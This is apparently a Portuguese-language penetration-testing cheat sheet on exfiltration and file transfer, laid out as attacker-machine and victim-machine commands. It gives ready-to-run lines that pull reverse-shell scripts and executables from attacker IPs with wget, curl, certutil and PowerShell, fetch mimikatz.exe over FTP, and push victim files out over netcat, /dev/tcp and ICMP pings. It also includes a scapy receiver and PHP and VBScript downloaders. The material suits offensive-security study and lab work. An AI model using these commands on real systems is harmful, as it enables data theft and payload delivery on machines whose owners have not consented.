# Exfiltração

## Copiar e Colar Base64

#### Linux

```bash
base64 -w0 <arquivo> # Codifica o arquivo
base64 -d arquivo # Decodifica o arquivo
```

#### Windows

```text
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

#### Linux

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py # FreeBSD
```

#### Windows

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://exemplo.com/arquivoexemplo.pdf C:\downloads\arquivoexemplo.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OU
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### Upload de arquivos

\*\*\*\*[**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)\*\*\*\*

### **Servidor HTTPS**

```python
# de https://gist.github.com/dergachev/7028596
# tirado de http://www.piware.de/2011/01/creating-an-https-server-in-python/
# gere o server.xml com o seguinte comando:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# execute do seguinte modo:
#    python simple-https-server.py
# e então no seu navegador, acesse:
#    https://localhost:443

import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

## FTP

### Servidor FTP \(python\)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### Servidor FTP \(NodeJS\)

```text
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### Servidor FTP \(pure-ftp\)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
# Rode o seguinte script para configurar o servidor FTP
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### Cliente **Windows**

```bash
# Funciona bem com python. Com o pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali como servidor

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Compartilha o diretório atual
kali_op2> smbserver.py -smb2support nomeDoCompartilhamento /caminho/para/o/diretório # Compartilha um diretório
# Para novas versões do Windows 10
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Ou crie um compartilhamento **smb usando samba**:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
# Adicione isto no final de /etc/samba/smb.conf:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
# Inicie o samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\caminho\para\o\executavel
CMD-Wind> net use z: \\10.10.14.14\test /user:test test # Para o SMB usando credenciais

WindPS-1> New-PSDrive -Name "novo_disco" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

## SCP

O atacante tem que ter o SSHd rodando.

```bash
scp <nome_do_usuario>@<ip_do_atacante>:<diretório>/<nome_do_arquivo> 
```

## NC

```bash
nc -lvnp 4444 > novo_arquivo
nc -vn <IP> 4444 < arquivo_de_exfiltração
```

## /dev/tcp

### Download de arquivo da vítima

```bash
nc -lvnp 80 > arquivo # máquina atacante
cat /caminho/para/o/arquivo > /dev/tcp/10.10.10.10/80 # máquina vítima
```

### Upload de arquivo para a vítima

```bash
nc -w5 -lvnp 80 < arquivo_para_enviar.txt # máquina atacante
# máquina vítima
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > arquivo.txt
```

obrigado ao **@BinaryShadow\_**

## **ICMP**

```bash
# Para exfiltrar o conteúdo de um arquivo via pings você pode fazer:
xxd -p -c 4 /caminho/para/o/arquivo | while read line; do ping -c 1 -p $line <IP atacante>; done
# Isso irá extrair 4 bytes por cada pacote de ping (você provavelmente pode aumentar até 16)
```

```python
from scapy.all import *
# Este é o receptor do ippsec criado na máquina Mischief do HTB
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] # Lê os 4 bytes interessantes
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## **SMTP**

Se você pode enviar dados para um servidor SMTP, você pode criar um SMTP para receber dados com python:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

## TFTP

Por padrão nos Windows XP e 2003 \(em outros ele precisa ser adicionado explicitamente durante a instalação\)

No Kali, **inicie o servidor TFTP**:

```bash
# Eu não consegui fazer essa opção funcionar e eu prefiro a opção em python
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**Servidor TFTP em python:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORTA> <INTERFACE DE REDE> <DIRETÓRIO>
```

Na **vítima**, conecte ao servidor Kali:

```bash
tftp -i <IP-DO-KALI> get nc.exe
```

## PHP

Download de um arquivo com uma linha de PHP:

```bash
echo "<?php file_put_contents('nomeDoArquivo', fopen('http://192.168.1.102/arquivo', 'r')); ?>" > down2.php
```

## VBScript

```bash
Atacante> python -m SimpleHTTPServer 80
```

#### Vítima

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

Esta é uma técnica maluca que funciona em máquinas Windows de 32 bits. Basicamente, a ideia é usar o programa `debug.exe`. Ele é usado para inspecionar binários, como um debugger. Mas ele também pode reconstruí-los a partir de hexadecimal. Então a ideia é pegarmos um binário como o `netcat`. Em seguida, desmontá-lo em hexadecimal, colar ele em um arquivo na máquina comprometida, e então remontá-lo com o `debug.exe`.

O `Debug.exe` só pode montar 64 kb. Portanto, precisamos usar arquivos menores que isso. Podemos usar o upx para compactá-lo ainda mais. Então vamos fazer isso:

```text
upx -9 nc.exe
```

Agora ele pesa apenas 29 kb. Perfeito. Agora vamos desmontá-lo:

```text
wine exe2bat.exe nc.exe nc.txt
```

Agora, basta copiar e colar o texto na nossa shell do windows. E ele irá criar automaticamente um arquivo chamado nc.exe

## DNS

[https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)